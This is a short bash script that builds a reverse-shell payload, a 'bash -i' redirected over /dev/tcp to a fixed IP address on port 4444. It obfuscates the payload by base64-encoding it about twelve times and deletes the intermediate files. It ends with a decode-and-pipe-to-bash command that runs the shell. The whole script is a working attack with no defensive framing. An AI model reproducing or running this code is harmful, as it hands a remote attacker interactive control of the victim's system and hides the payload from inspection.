#!/bin/bash 
	
# Basic Payload 

echo "bash -c 'exec bash -i &>/dev/tcp/82.29.164.156/4444 <&1'" | base64 > cc.txt

# Multiple Times Encode 

cat cc.txt | base64 > encode-payload.txt
cat encode-payload.txt | base64 > encode-payload-2.txt
cat encode-payload-2.txt | base64 > encode-payload-3.txt
cat encode-payload-3.txt | base64 > encode-payload-4.txt
cat encode-payload-4.txt | base64 > encode-payload-5.txt
cat encode-payload-5.txt | base64 > encode-payload-6.txt
cat encode-payload-6.txt | base64 > encode-payload-7.txt
cat encode-payload-7.txt | base64 > encode-payload-8.txt
cat encode-payload-8.txt | base64 > encode-payload-9.txt
cat encode-payload-9.txt | base64 > encode-payload-10.txt
cat encode-payload-10.txt | base64 > encode-payload-11.txt
cat encode-payload-11.txt | base64 > shell-encoded.txt

# Remove all .txt Files
rm cc.txt encode-payload*.txt

# final result output
cat shell-encoded.txt

# Command 

cat shell-encoded.txt | base64 -d | bash
